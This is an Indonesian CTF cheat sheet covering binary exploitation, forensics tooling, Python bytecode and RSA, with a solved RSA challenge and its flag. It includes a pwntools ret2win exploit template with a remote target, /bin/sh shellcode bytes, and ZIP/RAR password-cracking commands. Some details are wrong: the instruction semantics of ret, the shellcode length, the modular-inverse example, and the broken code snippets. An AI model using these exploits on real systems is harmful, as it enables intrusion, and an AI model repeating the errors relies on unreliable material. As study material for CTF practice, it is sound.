# Simple Cheat Sheet CyberSecurity
## PWN
### Introduction
Nah disini PWN atau bisa di sebut juga Binaries Exploit identik  jika ada remote yang langsung menjalankan program contoh ssh atau nc (netcat)

yang pertama yang dilakukan adalah untuk mengecek file binaries nya 
 ```sh
 cek file excutablenya di compile dengan arcitecture cpu apa:
 file <file_executeablenya>

cek proteksi yang di gunakan:
checksec <file_executeablenya>
 ```

### Get ret from binaries
mendapatkan ret? buat apa? ret ini sering exploit karena cara kerjanya seperti
```assambly
pop eax,
move eax
```
nah jadi dari itu bisa di exploit akses ke address lain. Coba deh buat belajar alur stack memory pasti identik akhir sebuah fungsi di assamblynya itu dengan instruksi ret. untuk penjelasan instruksi nya bisa di lihat nanti m=bagaimana maksudnya  

Berikut untuk melihat address ret jika server remotenya  berupa ubuntu server mungkin di butuhkan
```sh
ROPgadget --binary <nama file> --only "ret"
```
Atau
```sh
objdump -d <nama file> | grep -w ret
```
### basic Ret2Win
dengan sedikit automasi cari buffer overflow dan function address
perlu di cari manual [ret addres dari executable](#get-ret-from-binaries)

```python
from pwn import *

exe = './vuln'
elf = ELF(exe)
pl = process(exe)
pr = remote('ipnya', portnya) #ip dan port netcat
def find_ip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))
    info(f'Located RIP/EIP offset at {ip_offset}')
    return ip_offset

address = p32(<address ret>) #diganti dengan address ret
pattern = cyclic(500)
offset = find_ip(pattern)
win_func = elf.symbols[<nama function>] #di ganti dengan nama function yang di butuhkan

print(hex(win_func))
payload = flat(
    b'A' * offset,
    address,
    p32(win_func)
#jika perlu ada input an sebelumnya tambah p.sendline("apa gitu")
print(payload)
pl.recv()
pl.sendline(payload)
#jika berupa akses bash ganti dengan pl.interactive()
print(pl.clean())
#pr.recv()
#pr.sendline(payload)
#jika berupa akses bash ganti dengan pr.interactive()
#print(pr.clean())
```
### Shellcode
Shellcode? dah pasti dari nama nya Shell sama Code nah maksudnya apa? jadi kita menginject code gar memanggil /bin/sh. Wah kok keren gitu? bisa exploit akses shell nya 😍. Nah kok bisa exploit bisa akses shell itu gimana bang? maupun kayak keren gitu ada tapinya loo bahwa shell code tidak akan bekerja jika ada proteksi No-Execute (NX) atau Data Execution Prevention (DEP)

nah mungkin di basic nya dulu

#### Basic Shellcode
disini aku sudah buatin shellcode untuk akses /bin/sh
```
\x48\x31\xc0\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05

kalo di python

shellcode = B"\x48\x31\xc0\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05"
```
nah disini itu kan kalo di total ada 30 buffer yang kepake buat shell code akses /bin/sh jadi usahakan buffer yang di sediakan lebih dari 40 kalo kataku

nah ini contoh code c++ yang ada buffer overflow
```cpp
#include <iostream>
#include <cstring>

using namespace std;
int main() {
    char buffer[128];
    strcpy(buffer, input);
    return 0;
}
```



### Basic ROP
Exploit menggunakan ROP biasanya identik jika ada keamanan seperti No-Execute (NX) atau Data Execution Prevention (DEP)

PERLU DI PAHAMI

pointer = memory addres
```
LIST 32 bit register
eax - akumulator. Tujuan yang sangat umum. Digunakan untuk nilai pengembalian matematika, data, dan fungsi.

ebx - base address (dialam "ds" register).

ecx - counter. Digunakan untuk loop dan pengulangan.

edx - data. Tujuan yang sangat umum. Digunakan untuk matematika dan data.

esi - source index (dialam "ds" register). Digunakan untuk akses memori berurutan.

edi - destination index (dialam "es" register). Digunakan untuk akses memori berurutan.

ebp - base pointer (didalam "ss" register). Digunakan untuk frame tumpukan dalam fungsi.

esp - stack pointer (dialam "ss" register). Selalu menunjuk ke bagian terbawah tumpukan saat ini.

eip - instruction pointer. Selalu menunjuk ke instruksi berikutnya yang harus dieksekusi setelah instruksi saat ini.

eflags - status and condition flags. Menunjukkan apakah operasi matematika terakhir menghasilkan carry/overflow, menghasilkan nol, dll.


LIST SEGMENT
cs - code segment. biasanya "Eip" di sini.

ss - stack segment. biasanya "Esp" dan ebp di sini.

ds - data segment. biasanya "Ebx" dan esi di sini.

es - extra segment. biasanya "Edi" di sini.

fs - extra segment. informasi thread ada di sini.

gs - extra segment


CONTOH THREAD / INSTRUCTION 
push eax = kurangi 4 dari esp. dan copy value eax regsiter ke memory dituju oleh [ss:esp].

ret = Menyalin nilai dari memori di [ss:esp] ke eip (Instruction Pointer), kemudian menambahkan 4 byte ke esp. Artinya, instruksi ini mengeluarkan return address dari stack dan melompat kembali ke alamat yang disimpan dalam stack, biasanya setelah memanggil fungsi dengan instruksi call. Ini digunakan untuk keluar dari fungsi dan kembali ke tempat di mana fungsi tersebut dipanggil

retn = Menyalin nilai dari memori di [ss:esp] ke eip, dan menambahkan 4 byte ke esp. Instruksi ini mengambil return address dari stack dan melompat kembali ke alamat itu.

push eax = Mengurangi 4 byte dari esp, kemudian menyalin nilai dari register eax ke memori di [ss:esp]. Ini memasukkan nilai eax ke dalam stack.

mov eax, [ebx] = Menyalin nilai dari alamat memori yang ditunjukkan oleh ebx ke register eax.

mov [ebx], eax = Menyalin nilai dari register eax ke alamat memori yang ditunjukkan oleh ebx.

add eax, ebx = Menambahkan nilai register ebx ke eax. Hasilnya disimpan di register eax.

sub eax, ebx = Mengurangi nilai register ebx dari eax. Hasilnya disimpan di register eax.

xor eax, eax = Melakukan operasi XOR antara register eax dengan dirinya sendiri, menghasilkan nol (biasanya digunakan untuk membersihkan register).

cmp eax, ebx = Membandingkan nilai dari eax dan ebx dengan mengurangkannya secara virtual, tanpa menyimpan hasilnya. Ini mempengaruhi status flag untuk digunakan oleh instruksi jump bersyarat.

lea eax, [ebx+ecx*4] = Memuat alamat efektif dari ekspresi memori ebx + ecx * 4 ke register eax. Ini digunakan untuk menghitung alamat memori tanpa melakukan akses langsung.

inc eax = Menambahkan 1 ke nilai yang terdapat dalam register eax.

dec eax = Mengurangi 1 dari nilai yang terdapat dalam register eax.

int 0x80 = Melakukan interrupt perangkat lunak. Ini sering digunakan dalam sistem operasi Linux untuk melakukan syscall.

nop = Tidak melakukan apa-apa, hanya menghabiskan satu siklus CPU.

leave = Memindahkan nilai dari register ebp ke esp, kemudian melakukan pop ebp. Instruksi ini biasanya digunakan untuk membersihkan stack frame sebelum return dari fungsi.

pushf = Menyalin nilai dari flag register ke stack.

popf = Menyalin nilai dari stack ke flag register.

imul eax, ebx = Melakukan perkalian signed antara eax dan ebx, hasilnya disimpan di eax.

idiv ebx = Melakukan pembagian signed antara eax dan ebx. Hasilnya disimpan di register eax (hasil) dan edx (sisa bagi).


```

Nah tadi kan 32 kalo 64 sebenarnya sama aja tapi hanya nama registernya yang awalanya "e" jadi "r" contoh "esp" jadi "rsp", "ebp" jadi "rbp" 

## Forensik
Identifikasi tipe file: 
```file <nama_file>```
### Lihat Metadata file:
```sh
exiftool <nama_file>
strings <nama_file>
```
### Pengecekan Integritas Hash files:
```sh
md5sum <nama_file>
sha256sum <nama_file>
```
### Extraksi file:
```sh
binwalk -e <nama_file>
binwalk -e -M <nama_file> #untuk file recursive
```

### Carving file dari gambar:
```sh
foremost <nama_file>
scalpel <nama_file>
```
### ekstrak data tersembunyi (steganografi):
```
steghide extract -sf <nama_gambar> #untuk menemukan
zsteg <nama_gambar> #untuk PNG LSB
steghide embed -cf <file_gambar> -ef <file_yang_disembunyikan> #untuk menyembunyikan
stegify encode --carrier <file_gambar> --data <file_pesan> --result <output_file> #untuk menyembunyikan
stegify decode --carrier <file_gambar> #untuk mencari
```
### Analisis Dump Memori:
```
volatility -f <dump_memori> imageinfo #identifikasi gambar
volatility -f <dump_memori> pslist #ekstrak proses
volatility -f <dump_memori> memdump --pid=<id_proses> --dump-dir=. #dump memori proses
```
### Analisis Lalu Lintas Jaringan
#### Wireshark (analisis file .pcap):
Terapkan filter:
```
> ip.addr == <alamat_ip>
> tcp.port == <nomor_port>
```
Ikuti aliran TCP:
```
> Klik kanan -> Follow -> TCP Stream
```
### Ekstrak file dari pcap menggunakan tcpflow atau NetworkMiner:
```tcpflow -r <file_pcap>```
### Analisis lalu lintas DNS:
```tshark -r <file_pcap> -Y "dns"```
### Forensik PDF:
```sh
pdfinfo <file_pdf> #analisis data
pdfimages -all <file_pdf> <prefix_output> #ekstrak data
```
### Analisis spektrum audio:
```sh
sox <file_audio> -n spectrogram
```
### Membuka ZIP/RAR yang terkunci:
```sh
fcrackzip -v -u -D -p <daftar_password> <file_zip>
rar2john <file_rar> > hash.txt
john hash.txt --wordlist=<daftar_password>
```
### Hex Editor dan Manipulasi Biner
Hex Editor:
```sh
hexedit <nama_file>
xxd <nama_file>
```
### Chunk pada File PNG
Format PNG terdiri dari beberapa chunk. Setiap chunk memiliki tipe dan fungsi tertentu:
```
> IHDR: Chunk pertama yang berisi metadata utama seperti lebar dan tinggi gambar.
> PLTE: Berisi palet warna.
> IDAT: Berisi data gambar yang dikompresi.
> IEND: Chunk terakhir, menandakan akhir dari file PNG.
> IHDR Chunk (metadata utama gambar PNG):

> Byte 1-4: Ukuran chunk.
> Byte 5-8: Tipe chunk (IHDR).
> Byte 9-12: Lebar gambar (4 byte, unsigned integer).
> Byte 13-16: Tinggi gambar (4 byte, unsigned integer).
> Byte 17: Bit depth.
> Byte 18: Tipe warna.
```
Misal, untuk memeriksa lebar dan tinggi gambar PNG:
```
xxd <file_png> | grep IHDR
```
### Valid PNG Chunks:
> IHDR: Header file PNG.
> PLTE: Palet warna (opsional).
> IDAT: Data gambar (bisa ada beberapa).
> IEND: Penutup file PNG.
Detail Chunk pada File JPG

- **File JPG** terdiri dari beberapa segmen, yang masing-masing dimulai dengan marker (penanda). Setiap segmen memiliki fungsi tertentu. Segmen-segmen ini ditandai dengan dua byte yang dimulai dengan **0xFF**, diikuti oleh byte untuk penanda spesifik.

- **Marker Penting pada File JPG**:
  - **SOI (Start of Image)**: Menandai awal dari file JPG. Signature: `FF D8`.
  - **APPn (Application Marker Segments)**: Digunakan untuk menyimpan metadata, misalnya EXIF data (biasanya pada APP1). Signature: `FF E0` hingga `FF EF`.
  - **DQT (Define Quantization Table)**: Menyimpan informasi tabel kuantisasi untuk kompresi gambar. Signature: `FF DB`.
  - **SOF (Start of Frame)**: Mengandung informasi penting tentang resolusi gambar dan format warna. Ada beberapa jenis SOF:
    - **SOF0** (Baseline DCT): Signature: `FF C0`.
    - **SOF2** (Progressive DCT): Signature: `FF C2`.
  - **DHT (Define Huffman Table)**: Menyimpan informasi tabel Huffman untuk kompresi. Signature: `FF C4`.
  - **SOS (Start of Scan)**: Menandakan dimulainya data gambar terkompresi. Signature: `FF DA`.
  - **EOI (End of Image)**: Menandai akhir file JPG. Signature: `FF D9`.

- **SOF Chunk (Segmen Frame)** dalam JPG mengandung informasi tentang ukuran gambar:
  - **Byte 5-6**: Jumlah baris (tinggi gambar).
  - **Byte 7-8**: Jumlah kolom (lebar gambar).

Contoh untuk memeriksa lebar dan tinggi gambar JPG:
  ```
  xxd <file_jpg> | grep -A 2 "ff c0"
  ```
### Signature File untuk File Audio
Signature file audio penting untuk mengidentifikasi jenis file berdasarkan header-nya.

MP3:
```
> Signature: 49 44 33 (ID3 tag untuk metadata di awal file MP3).
> Alternatif signature untuk frame audio: FF FB (frame MP3).
WAV:
> Signature: 52 49 46 46 (RIFF) dan 57 41 56 45 (WAVE).
FLAC:
> Signature: 66 4C 61 43 00 00 00 22.
OGG:
> Signature: 4F 67 67 53.
AIFF:
> Signature: 46 4F 52 4D (FORM) dan 41 49 46 46 (AIFF).
MIDI:
> Signature: 4D 54 68 64
```

# Rerverse Enginering
Reverse biasanya sering digunakan untuk melihat cara kerja dari program tersebut yang tidak biasanya muncul di output program

## Python
mungkin cuman di hasil output bytecode di python

LIST INSTRUCTION BYTECODE PYTHON :
```
CONST
Inisialisasi Variable

STOP_CODE
Menandakan akhir kode untuk compiler, tidak digunakan oleh interpreter.

POP_TOP
Menghapus item teratas dari stack (TOS).

ROT_TWO
Menukar dua item teratas dari stack.

ROT_THREE
Menggeser item kedua dan ketiga di stack satu posisi ke atas, dan memindahkan item teratas ke posisi ketiga.

DUP_TOP
Menggandakan referensi di atas stack.

Operasi Unary
Mengambil item teratas dari stack, menerapkan operasi, dan mengembalikan hasilnya ke stack.

UNARY_POSITIVE
Mengimplementasikan TOS = +TOS.

UNARY_NEG
Mengimplementasikan TOS = -TOS.

UNARY_NOT
Mengimplementasikan TOS = not TOS.

UNARY_CONVERT
Mengimplementasikan TOS = \TOS``.

UNARY_INVERT
Mengimplementasikan TOS = ~TOS.

Operasi Binary
Menghapus dua item teratas dari stack (TOS dan TOS1), melakukan operasi, dan mengembalikan hasilnya ke stack.

BINARY_POWER
Mengimplementasikan TOS = TOS1 ** TOS.

BINARY_MULTIPLY
Mengimplementasikan TOS = TOS1 * TOS.

BINARY_DIVIDE
Mengimplementasikan TOS = TOS1 / TOS.

BINARY_MODULO
Mengimplementasikan TOS = TOS1 % TOS.

BINARY_ADD
Mengimplementasikan TOS = TOS1 + TOS.

BINARY_SUBTRACT
Mengimplementasikan TOS = TOS1 - TOS.

BINARY_SUBSCR
Mengimplementasikan TOS = TOS1[TOS].

BINARY_LSHIFT
Mengimplementasikan TOS = TOS1 << TOS.

BINARY_RSHIFT
Mengimplementasikan TOS = TOS1 >> TOS.

BINARY_AND
Mengimplementasikan TOS = TOS1 and TOS.

BINARY_XOR
Mengimplementasikan TOS = TOS1 ^ TOS.

BINARY_OR
Mengimplementasikan TOS = TOS1 or TOS.

Opcode Slice
Mengambil hingga tiga parameter.

SLICE+0
Mengimplementasikan TOS = TOS[:].

SLICE+1
Mengimplementasikan TOS = TOS1[TOS:].

SLICE+2
Mengimplementasikan TOS = TOS1[:TOS1].

SLICE+3
Mengimplementasikan TOS = TOS2[TOS1:TOS].

Operasi Lainnya
STORE_SLICE+0
Mengimplementasikan TOS[:] = TOS1.

STORE_SLICE+1
Mengimplementasikan TOS1[TOS:] = TOS2.

STORE_SLICE+2
Mengimplementasikan TOS1[:TOS] = TOS2.

STORE_SLICE+3
Mengimplementasikan TOS2[TOS1:TOS] = TOS3.

DELETE_SLICE+0
Mengimplementasikan del TOS[:].

DELETE_SLICE+1
Mengimplementasikan del TOS1[TOS:].

DELETE_SLICE+2
Mengimplementasikan del TOS1[:TOS].

DELETE_SLICE+3
Mengimplementasikan del TOS2[TOS1:TOS].

STORE_SUBSCR
Mengimplementasikan TOS1[TOS] = TOS2.

DELETE_SUBSCR
Mengimplementasikan del TOS1[TOS].

PRINT_EXPR
Mengimplementasikan pernyataan ekspresi untuk mode interaktif. TOS dihapus dari stack dan dicetak.

Kontrol Alur Program
BREAK_LOOP
Mengakhiri loop karena pernyataan break.

RETURN_VALUE
Mengembalikan dengan TOS ke pemanggil fungsi.

POP_BLOCK
Menghapus satu blok dari stack blok.

END_FINALLY
Mengakhiri blok finally.

JUMP_FORWARD delta
Meningkatkan penghitung bytecode dengan delta.

JUMP_IF_TRUE delta
Jika TOS benar, meningkatkan penghitung bytecode dengan delta.

JUMP_IF_FALSE delta
Jika TOS salah, meningkatkan penghitung bytecode dengan delta.

JUMP_ABSOLUTE target
Mengatur penghitung bytecode ke target.

Operasi Lainnya
LOAD_CONST consti
Menempatkan co_consts[consti] ke stack.

LOAD_NAME namei
Menempatkan nilai yang berasosiasi dengan co_names[namei] ke stack.

STORE_NAME namei
Mengimplementasikan name = TOS.

LOAD_GLOBAL namei
Memuat global yang bernama co_names[namei] ke stack.

LOAD_CONST: Memuat konstanta dari daftar co_consts ke atas stack. Ini digunakan untuk memuat nilai konstan seperti bilangan bulat, string, atau None ke stack.

POP_TOP: Menghapus elemen teratas dari stack.

DUP_TOP: Menggandakan elemen teratas dari stack.

ROT_TWO: Menukar dua elemen teratas dari stack.

ROT_THREE: Memutar tiga elemen teratas, sehingga elemen teratas turun ke posisi ketiga.

BINARY_ADD, BINARY_SUBTRACT, BINARY_MULTIPLY, BINARY_DIVIDE, BINARY_MODULO: Menerapkan operasi aritmatika dasar antara dua elemen teratas di stack.

UNARY_NEGATIVE, UNARY_POSITIVE, UNARY_NOT: Mengaplikasikan operasi unar pada elemen teratas di stack. Misalnya, UNARY_NEGATIVE akan membalik tanda elemen teratas (negatif).

STORE_NAME, LOAD_NAME: Digunakan untuk menyimpan dan memuat variabel yang diidentifikasi dengan nama dalam daftar co_names.

STORE_GLOBAL, LOAD_GLOBAL: Sama seperti STORE_NAME dan LOAD_NAME, tetapi berlaku untuk variabel global.

STORE_FAST, LOAD_FAST: Digunakan untuk menyimpan dan memuat variabel lokal dari daftar co_varnames.

CALL_FUNCTION: Memanggil fungsi dengan jumlah argumen tertentu yang disimpan di stack. Argumen ini diambil dari stack dan dilewatkan ke fungsi yang dipanggil.

RETURN_VALUE: Mengembalikan nilai dari fungsi (elemen teratas dari stack).

JUMP_IF_TRUE dan JUMP_IF_FALSE: Melompat ke alamat instruksi tertentu jika elemen teratas dari stack adalah True atau False.

JUMP_ABSOLUTE: Melompat ke alamat bytecode tertentu tanpa syarat.

SETUP_LOOP, BREAK_LOOP, CONTINUE_LOOP: Digunakan dalam pengaturan loop, melompat keluar dari loop (break), atau melanjutkan iterasi berikutnya (continue).

COMPARE_OP: Menerapkan operasi perbandingan antara dua elemen teratas dari stack, seperti <, >, ==, dll.

BUILD_TUPLE, BUILD_LIST, BUILD_MAP, BUILD_SET: Membuat tuple, list, map (dictionary), atau set dari elemen yang ada di stack.

LOAD_ATTR, STORE_ATTR: Mengambil atau menyimpan atribut objek. Ini digunakan untuk operasi seperti obj.attr.

IMPORT_NAME, IMPORT_FROM: Digunakan dalam instruksi impor. IMPORT_NAME mengimpor modul, sementara IMPORT_FROM mengambil atribut dari modul yang diimpor.

RAISE_VARARGS: Mengangkat (raise) sebuah pengecualian dengan argumen tertentu.

YIELD_VALUE: Digunakan dalam fungsi generator untuk menghasilkan nilai menggunakan yield.

FORMAT_VALUE: Digunakan untuk f-string, memformat nilai sebelum memasukkannya ke string yang diformat.

```
CONTOHNYA :

```python
def add(x, y):
    return x + y

result = add(2, 3)
print(result)
```

HASIL BYTECODE :
```
  2           0 LOAD_FAST                0 (x)
              2 LOAD_FAST                1 (y)
              4 BINARY_ADD
              6 RETURN_VALUE

  5           0 LOAD_CONST               1 (2)
              2 LOAD_CONST               2 (3)
              4 CALL_FUNCTION            2
              6 STORE_NAME               0 (result)
              8 LOAD_NAME                1 (print)
             10 LOAD_NAME                0 (result)
             12 CALL_FUNCTION            1
             14 POP_TOP
             16 LOAD_CONST               0 (None)
             18 RETURN_VALUE
```

cara ngerubah .pyc ke bytecode agar bisa di baca
Pakai marshal
```python
import dis
import marshal

with open('example.cpython-39.pyc', 'rb') as f:
    f.seek(16)  # Lewati header file .pyc
    code_object = marshal.load(f)

dis.dis(code_object)

```

## Cryptografi
### RSA Cryptography

```
Disini diketahui = 

P = Large Prime 
Q = Large Prime 
N = P x Q
R = (P-1)(Q-1)
E = 3, 5, 17, 65537
D = e^-1 mod(r)
```
```
Example For D = 5 mod(2)
              = 5/2
              = 1
```
```
Public Key (e, n)
Private Key (d)
```
```
To Encrypt = m^e mod(n)
To Decrypt = c^d mod(n)
```
```
Example Encrypt = p = 11
                  q = 3
                  n = 33
                  r = 20
                  e = 3
                  d = 7

                  = 7^3 mod(33)
                  = 7^3 = 343
                  = 343/33 = 10 Reminder 13
                  = Cipertext = 13
```
```
To Decrypt = 13^7 mod(33)
           = 13^7 62748517
           = 62748517/33
           = 1901470 Remind 7
           = Message 7
```
#### Like This : 

```python
❯ cat chall.py
from Crypto.Util.number import *
flag = bytes_to_long(b";HelloWorld(printf)")
p = getPrime(2048)
q = getPrime(2048)
r = getRandomInteger(20)
n = p*q
c = pow(flag,65537,n)
leak = (p-r)*(q-r)
print(f"""
{c = }
{n = }
{leak = }
""")
❯ cat output.txt
c = 482141814293590197502811474932029460661002532026573389658314180817247220459567499644958813997954118165812805842379533342289685282342190878463555770319306702212371338421308577197808075733262746698915443870285704975713938187354245306882018603981861096910392565923449771474244846133935858183892442399384530396818463948228866440593529120035856503573645835417661055033375809617574668281810192642128039857794375578196515576016282697213146284137358859161967849203722347022670851942110328128090220811544954105609007156939589338442749349192205490919357312671666371523730743353967110958600501669921250066538273401682291394345855460667419963405890047662195424411646413051239913962784724603414614295672619281243619974099998284023569416931872380118826378415952641962074347822268988907665410162093893191294976542657310550364750171962183438541560667737058713130139687475959700180617174146124271080565029179919134970482251352276610620942172891344884427239369811412269931877319732705001157215137568954175594638966910255750482059458912720602745097824142949013286464493638164353122838573908807596997028438262020669411601445790668381313964905487504298277380439317740327368087769300728419726732791363279157290655787601257794628395101155639644842341699135
n = 528436262580846762901857325732232736166648872939103083309075323048587144665954366777770148670341638915508142465585694148586624262254279715845025884663224007901604258112098741924026794890723351011365114928314766612423088250135432651223560612140330927943276397565467670534462207869414259529142429718464416773512359946991571592204492141250666736784231663247562147233712076630210133179093152151398423048305060473935185962540742726006346865417521629615431055243138663866994101573889476423432510959941832587087755700047074410076555077651720048033601793183807447694510380286157468177852775857722889745254569773294028743199581982618427539635114018387999459427096585596693094766887196412186777166762256300898635951447124132990564023307970180232108839523620932245689560214004901167211276865443187285178973208030606403570904348286971729129443319014922388783953027047306977514434942111024688334842204849639082723659326322942197554172703594382622361330415889304337481105006710674314832429392048823309376897392093291814544752178756331313933326274918397555806383966827938477797887626322295583067419678526170502751051815999547491346475838775493379963575950945383094288905785578862781590155292357993465257441076750559390702777793879920773923360505729
leak = 528436262580846762901857325732232736166648872939103083309075323048587144665954366777770148670341638915508142465585694148586624262254279715845025884663224007901604258112098741924026794890723351011365114928314766612423088250135432651223560612140330927943276397565467670534462207869414259529142429718464416773512359946991571592204492141250666736784231663247562147233712076630210133179093152151398423048305060473935185962540742726006346865417521629615431055243138663866994101573889476423432510959941832587087755700047074410076555077651720048033601793183807447694510380286157468177852775857722889745254569773294028714802587756819617526310246486562249308878287369930281829317109892460612723293059038039377951279889185229047320642775074454514818408542100144672509117014404047926851555589041911378576323871490499216596863639711990956042881047663425365554770338969149632362156926749689032941662498470212439140672375430670960299764832213587813403640167633921698621055954011608605679143972873686998704229434426363359898491268123599344516156578500620032253510315791194134471452469574313538124525100206752789188994952941057690705690718223779232894758631999316421367042043555780702270494361128263524494859425138025952452591616585550294890683685104
e = 65537

❯ cat solver.py
from pwn import *
from math import isqrt
from Crypto.Util.number import inverse

def solve(C, N, L):
  poss = []
  mlim = 2**20
  for x in range(1, mlim):
      a = x
      b = L-N-x**2
      c = x*N
      d = b**2-4*a*c
      if (d < 0):
          continue
      qform = (-b + isqrt(d))//(2*a)
      p = N//qform
      if ((p-x)*(qform-x) == L):
          poss.append((qform))
          break
  p, q = poss[0], N//poss[0]
  phi = (p-1)*(q-1)
  e = 65537
  d = inverse(e, phi)
  decrypted = pow(C, d, N)
  return decrypted

# Call the function with the given values
c = 482141814293590197502811474932029460661002532026573389658314180817247220459567499644958813997954118165812805842379533342289685282342190878463555770319306702212371338421308577197808075733262746698915443870285704975713938187354245306882018603981861096910392565923449771474244846133935858183892442399384530396818463948228866440593529120035856503573645835417661055033375809617574668281810192642128039857794375578196515576016282697213146284137358859161967849203722347022670851942110328128090220811544954105609007156939589338442749349192205490919357312671666371523730743353967110958600501669921250066538273401682291394345855460667419963405890047662195424411646413051239913962784724603414614295672619281243619974099998284023569416931872380118826378415952641962074347822268988907665410162093893191294976542657310550364750171962183438541560667737058713130139687475959700180617174146124271080565029179919134970482251352276610620942172891344884427239369811412269931877319732705001157215137568954175594638966910255750482059458912720602745097824142949013286464493638164353122838573908807596997028438262020669411601445790668381313964905487504298277380439317740327368087769300728419726732791363279157290655787601257794628395101155639644842341699135
n = 528436262580846762901857325732232736166648872939103083309075323048587144665954366777770148670341638915508142465585694148586624262254279715845025884663224007901604258112098741924026794890723351011365114928314766612423088250135432651223560612140330927943276397565467670534462207869414259529142429718464416773512359946991571592204492141250666736784231663247562147233712076630210133179093152151398423048305060473935185962540742726006346865417521629615431055243138663866994101573889476423432510959941832587087755700047074410076555077651720048033601793183807447694510380286157468177852775857722889745254569773294028743199581982618427539635114018387999459427096585596693094766887196412186777166762256300898635951447124132990564023307970180232108839523620932245689560214004901167211276865443187285178973208030606403570904348286971729129443319014922388783953027047306977514434942111024688334842204849639082723659326322942197554172703594382622361330415889304337481105006710674314832429392048823309376897392093291814544752178756331313933326274918397555806383966827938477797887626322295583067419678526170502751051815999547491346475838775493379963575950945383094288905785578862781590155292357993465257441076750559390702777793879920773923360505729
dont_leak_this = 528436262580846762901857325732232736166648872939103083309075323048587144665954366777770148670341638915508142465585694148586624262254279715845025884663224007901604258112098741924026794890723351011365114928314766612423088250135432651223560612140330927943276397565467670534462207869414259529142429718464416773512359946991571592204492141250666736784231663247562147233712076630210133179093152151398423048305060473935185962540742726006346865417521629615431055243138663866994101573889476423432510959941832587087755700047074410076555077651720048033601793183807447694510380286157468177852775857722889745254569773294028714802587756819617526310246486562249308878287369930281829317109892460612723293059038039377951279889185229047320642775074454514818408542100144672509117014404047926851555589041911378576323871490499216596863639711990956042881047663425365554770338969149632362156926749689032941662498470212439140672375430670960299764832213587813403640167633921698621055954011608605679143972873686998704229434426363359898491268123599344516156578500620032253510315791194134471452469574313538124525100206752789188994952941057690705690718223779232894758631999316421367042043555780702270494361128263524494859425138025952452591616585550294890683685104
print(solve(c, n, dont_leak_this))

❯ python3
Python 3.12.4 (main, Jun  7 2024, 06:33:07) [GCC 14.1.1 20240522] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> flag = 9427751939329949278625530962245727070775388397540685185363158267539836605174959697936887820228266049405
>>> long_to_bytes(flag)
b'CYHUNT24{just_a_simple_algebra_am_i_right?}'
```

#### NB : Baru terjun di Cryptography hehehehe, maaf kalau ada yang kurang
Semoga membantu!

## Created by Ore wa mou main ceteep